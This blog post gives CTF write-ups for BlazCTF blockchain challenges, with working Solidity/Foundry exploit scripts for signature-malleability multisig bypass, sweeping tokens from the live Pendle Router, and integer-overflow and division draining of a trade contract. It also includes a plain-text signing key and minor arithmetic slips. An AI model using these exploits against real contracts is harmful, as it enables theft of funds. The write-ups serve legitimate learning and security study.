---
title: 🔥 BlazCTF Writeups
author: Ashiq Amien
date: 2024-09-25 11:18:00 +0200
categories: [CTF, Blockchain]
tags: ctf
math: true
---

## Cyber Cartel

Cyber Cartel was a challenge that involved draining a treasury contract with a flawed multisig implementation. The win condition was to drain the ETH from the treasury, which is possible when the protected `doom()` function is called. The multisig is setup as follows:

- There are 3 signers, called guardians
- Submitting and executing a proposal is permissionless, provided there are enough signatures
- The number of signatures required to submit and execute a proposal is decreased by 1 if a guardian submits a proposal

Part of what makes the multisig implementation faulty is due to the following:

- 2 of the 3 guardians are set to the same address `0xA66b...c30D`, while the 3rd is set to us, the player
- Signature validation is implemented to check that incoming signatures are unique, not signers
- Signatures are malleable, meaning that signatures were not unique for a given message

The last point is the most important one, since it means for a single valid signature we can generate a different valid signature for the same message hash. This is due to the symmetry over the x-axis of elliptic curves. A more comprehensive explanation can be found [here](https://medium.com/draftkings-engineering/signature-malleability-7a804429b14a).

Between the above points, we could drain the treasury as follows:

1. Create a proposal that targets the protected `gistCartelDismiss()` function to disable the multisig access control:

```javascript
Proposal memory prop;
prop.expiredAt = type(uint32).max;
prop.gas = type(uint24).max;
prop.nonce = 5;
prop.data = abi.encodeWithSignature("gistCartelDismiss()");
console.logBytes32(bodyguard.hashProposal(prop));

>>> 0xbe4a501b341b01ad766cbe306b95dd03e02d1af588110f12bc93b7eedce71a20
```

2. Sign the proposal hash with the player's private key. Note that we want to sign the proposal hash and not hash it again, so pass the `--no-hash` flag:

```javascript
cast wallet sign --no-hash --private-key  0xa7c3cc196ea8a05f49d06121e12299fb686b7b477ec0b048e8120fb5ac86d167 0xbe4a501b341b01ad766cbe306b95dd03e02d1af588110f12bc93b7eedce71a20

>>> 0xfd0e7c1e85cd704096fb062a8d18a92f0f43ed2294cac8b6ccd0214c6e4e8f213e16d5b1bf7d3740673b0a5429765c8067428d154451f2b85604fb13e8b76d191c
```

3. Take advantage of signature malleability and generate a second valid signature. `Malley` is the Attack contract from [this article](https://medium.com/draftkings-engineering/signature-malleability-7a804429b14a):

```javascript
Malley mal = new Malley();
bytes memory signed = hex"fd0e7c1e85cd704096fb062a8d18a92f0f43ed2294cac8b6ccd0214c6e4e8f213e16d5b1bf7d3740673b0a5429765c8067428d154451f2b85604fb13e8b76d191c";
bytes memory secondSig = mal.manipulateSignature(signed);
console.log("second sig");
console.logBytes(secondSig);

>>> second sig
>>> 0xfd0e7c1e85cd704096fb062a8d18a92f0f43ed2294cac8b6ccd0214c6e4e8f21c1e92a4e4082c8bf98c4f5abd689a37e536c4fd16af6ad8369cd6378e77ed4281b
```

4. Submit and execute the proposal as the player, which decreases the number of needed signatures from 3 to 2. Then call the now unprotected `doom()` function, which drains the treasury:

```javascript
uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
vm.startBroadcast(deployerPrivateKey);                                
bodyguard.propose(prop, sortedSigs);
treasury.doom();        
vm.stopBroadcast();    
console.log(chal.isSolved());

>>> true
```

Note that the `sortedSigs` is just an array of the two signatures needed to execute the proposal, sorted by their keccak hash. 

As for remediation, there's two main bug fixes that would have prevented this exploit. One is to fix signature malleability which is done by checking that an incoming signature's `s` parameter is in the lower half order, as described in [OZ's `ECDSA's` `tryRecover()` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L127-L137). The second is to check that signatures match with a sorted array of guardians, and that each signature matches a unique guardian. This is to prevent allowing 2 valid signatures from the same signer, regardless of signature malleability. 

## Oh Fuck (Pendle)

This was a simple challenge- recover mistakenly sent tokens to the live, immutable Pendle Router at [0x00000000005bbb0ef59571e58418f9a4357b68a0](https://etherscan.io/address/0x00000000005bbb0ef59571e58418f9a4357b68a0#code). The Pendle Router is a [diamond proxy](https://eips.ethereum.org/EIPS/eip-2535) with 5 facets to facilitate Pendle trading activity. 

Pendle allows users to send arbitrary tokens to be swapped before and after Pendle trades to allow users to easily swap out tokens to their PT/YT/SY tokens. In particular, the `ActionMiscV3` facet allows users to swap between two arbitrary tokens directly with the `swapTokenToToken()` function:

```javascript
function swapTokenToToken(
    address receiver,
    uint256 minTokenOut,
    TokenInput calldata inp
) external payable returns (uint256 netTokenOut) {
    _swapTokenInput(inp);

    netTokenOut = _selfBalance(inp.tokenMintSy);
    if (netTokenOut < minTokenOut) {
        revert Errors.RouterInsufficientTokenOut(netTokenOut, minTokenOut);
    }

    _transferOut(inp.tokenMintSy, receiver, netTokenOut);
}
```

This function performs the swap and sends out the entire balance of `inp.tokenMintSy` if it hits the `minTokenOut` threshold, both values which we control. Moreover, the swap performed also relies on an aggregator/swapper we control, with all the input parameters being control in the `TokenInput inp` param:

```javascript
function _swapTokenInput(TokenInput calldata inp) internal {
    if (inp.tokenIn == NATIVE) _transferIn(NATIVE, msg.sender, inp.netTokenIn);
    else _transferFrom(IERC20(inp.tokenIn), msg.sender, inp.pendleSwap, inp.netTokenIn);

    IPSwapAggregator(inp.pendleSwap).swap{value: inp.tokenIn == NATIVE ? inp.netTokenIn : 0}(
        inp.tokenIn,
        inp.netTokenIn,
        inp.swapData
    );
}
```

This means that we simply need to adjust the right parameters so that we transfer in nothing, perform no swap, and set the desired token to sweep as `inp.tokenMintSy`. Pendle also has [public examples](https://github.com/pendle-finance/pendle-examples-public/blob/main/src/StructGen.sol) on encoding the `InputStruct`, so we can use that as part of our POC:

```javascript
abstract contract StructGen {
    // EmptySwap means no swap aggregator is involved
    SwapData public emptySwap;
    ...

    function createTokenInputStructForPOC(address tokenInput, uint256 netTokenIn, address swap) internal view returns (TokenInput memory) {
    return TokenInput({
        tokenIn: 0x000000000000000000000000000000000000dEaD,
        netTokenIn: netTokenIn,
        tokenMintSy: tokenInput,
        pendleSwap: swap,
        swapData: emptySwap
    });
}
...
```
Since we transfer 0 tokens, the `tokenIn` isn't important since no transfer takes place in the [TokenHelper lib](https://etherscan.io/address/0x8086174bE8FC721CbF275545193a73f56FBF3384#code#F11#L20). Our aggregator is straightforward too:

```javascript    
contract Nopper{

    function swap(address token, uint amt, SwapData calldata swapdata) public {  
        uint nop = 42069;      
    }
}
```

Piecing everything together, we just pass in our nop-swapper and token address into the `createTokenInputStructForPOC()` function and send it off to the router:

```javascript
function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(deployerPrivateKey);        
    Nopper nop = new Nopper();        
    Challenge chal = Challenge(0x43fb730c44f030be579B465D65eBA6E51fCF8C47);
    address player = chal.PLAYER();
    address token = chal.token();
    router.swapTokenToToken(player,0,createTokenInputStructForPOC(address(token),0,address(nop)));        
    vm.stopBroadcast();     
}
```

## 8inch

This challenge provides us with an intent-based trading contract, `TradeSettlement`, and sets it up with a trade to sell 10 WOJAK tokens for 1 WETH. The goal is that the address 0xc0ffee has 10 WOJAK tokens. Note that WETH in this case is not wrapped Ether, just another token created by the challenge contract and controls the full supply. 

Looking at the `TradeSettlement`, there are only 2 venues for WOJAK tokens to flow out to some recipient, `settleTrade()` and `cancelTrade()`. `cancelTrade()` only allows the trade maker to cancel their own trade, so the only way this challenge can be solved is through the `settleTrade()` function somehow. The first thing that becomes clear is that there is an unsafe divsion taking place in one of the transfer functions:

```javascript
function settleTrade(uint256 _tradeId, uint256 _amountToSettle) external nonReentrant {
    Trade storage trade = trades[_tradeId];
    require(trade.isActive, "Trade is not active");
    require(_amountToSettle > 0, "Invalid settlement amount");
    uint256 tradeAmount = _amountToSettle * trade.amountToBuy;
    require(trade.filledAmountToSell + _amountToSettle <= trade.amountToSell, "Exceeds available amount");


    //unsafe integer division
    require(IERC20(trade.tokenToBuy).transferFrom(msg.sender, trade.maker, tradeAmount / trade.amountToSell), "Buy transfer failed");
    ...
}
```
Since there is an order to trade 10 WOJAK for 1 WETH, if we submitted a `settleTrade()` call that settled 9 WETH wei, we'd end up with receive 9 WOJAK wei for free. That's because the `transferFrom` amount is 9 * 1e18 (our 9 wei times the 1 WETH output wanted), divided by 10e18, the amount of WOJAK to sell. Since solidity truncates the remainer, `19e18`/`10e18` = 0, meaning no WETH is transferred from us. 

We can repeat this as many times as needed, but performing this exploit to drain the contract this way is infeasible since it requires `10e18`/`9` calls at least.

Looking at the rest of the code, we see that there's a `createTrade()` and `scaleTrade()` function. Scaling a trade seems like an unusual function, and looking closely we can see that it allows the trade maker to scale their order by some `uint256`, only for it to be casted to `uint112` at a later stage. The cast function was a custom implementation as follows:

```javascript
contract SafeUint112 {
    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow
    function safeCast(uint256 value) internal pure returns (uint112) {
        require(value <= (1 << 112), "SafeUint112: value exceeds uint112 max");
        return uint112(value);
    }

    /// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow
    function safeMul(uint112 a, uint256 b) internal pure returns (uint112) {
        require(uint256(a) * b <= (1 << 112), "SafeUint112: value exceeds uint112 max");
        return uint112(a * b);
    }
}
```
Since `safeCast()` can return 0 if our `value = 1 << 122`, what if we had a 1 wei trade and scaled it up to overflow? Does that do anything? Let's look at `scaleTrade()`:

```javascript
function scaleTrade(uint256 _tradeId, uint256 scale) external nonReentrant {
    require(msg.sender == trades[_tradeId].maker, "Only maker can scale");
    Trade storage trade = trades[_tradeId];
    require(trade.isActive, "Trade is not active");
    require(scale > 0, "Invalid scale");
    require(trade.filledAmountToBuy == 0, "Trade is already filled");
    uint112 originalAmountToSell = trade.amountToSell;

    //our safeCast and safeMul calls are here
    trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale));
    trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale));
    uint256 newAmountNeededWithFee = safeCast(safeMul(originalAmountToSell, scale) + fee);
    if (originalAmountToSell < newAmountNeededWithFee) {
        require(
            IERC20(trade.tokenToSell).transferFrom(msg.sender, address(this), newAmountNeededWithFee - originalAmountToSell),
            "Transfer failed"
        );
    }
}
```
After some thinking, it becomes clear that we'd want to scale our trade parameters, while attempting to overflow the `newAmountNeededWithFee - originalAmountToSell` amount so that we don't transfer in tokens. Keeping in mind our divison error from earlier, it means we'd be able to siphon a larger amount from the contract, since the denominator of our trade, `trade.amountToSell` is large. The steps to our exploit are as follows:

1. Siphon some WOJAK wei a few times. This allows us to create a WOJAK trade and pay the 30 wei fee.
2. Create a trade trading WOJAK for WOJAK, with 31 wei as the amount to sell. This leaves the `trade.amountToSell` as just 1. 
2. Scale the trade so that we overflow on the amount to transfer while significantly increasing our trade parameters. Since our `trade.amountToSell` is 1, the amount to scale buy is `(1 << 112) - 30`. The `-30` is included since scaling requires paying a fee.
3. Settle our own trade, with the settling amount as the full balance of WOJAK left in the contract. This exploits the division error, and transfers the full balance to us.
4. Lastly, send the WOJAK to 0xc0ffee to complete the challenge.  

```javascript
function run() external {                                   
    TradeSettlement ts = TradeSettlement(chal.tradeSettlement());        
    IERC20 wojak = IERC20(chal.wojak());
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(deployerPrivateKey);               
    ts.settleTrade(0, 9);
    ts.settleTrade(0, 9);
    ts.settleTrade(0, 9);
    ts.settleTrade(0, 9);
    ts.settleTrade(0, 9);
    ts.settleTrade(0, 9);
    ts.settleTrade(0, 9);
    ts.settleTrade(0, 9);            
    wojak.approve(address(ts), 70);    
    ts.createTrade(address(wojak),address(wojak),31,0);     
    ts.scaleTrade(1, (1 << 112) - 30);

    (
        address maker,
        address taker,
        address tokenToSell,
        address tokenToBuy,
        uint256 amountToSell,
        uint256 amountToBuy,
        uint256 filledAmountToSell,
        uint256 filledAmountToBuy,            
    ) = ts.getTrade(1);
    ts.settleTrade(1, wojak.balanceOf(address(ts)));    
    wojak.transfer(address(0xc0ffee), 10 ether);      
    vm.stopBroadcast();    
}
```

## Conclusion

This was a fun CTF! I'm leaving out the writeups Ciao and BigenLayer because they were mostly trivial. I was pretty close to solving Tonyallet, but I was down a wrong rabbithole for too long before I could solve it. I'm quite keen to see the writeups of the one-eyed man challenge and the REVMC challenge as well. Maybe I'll give it a bash in my spare time and post some writeups. 

I'm down to try teaming up for CTFs :) I'm keen to learn to play MEV/PWN/REV web3 CTFs, so if that interests you send me a twitter DM!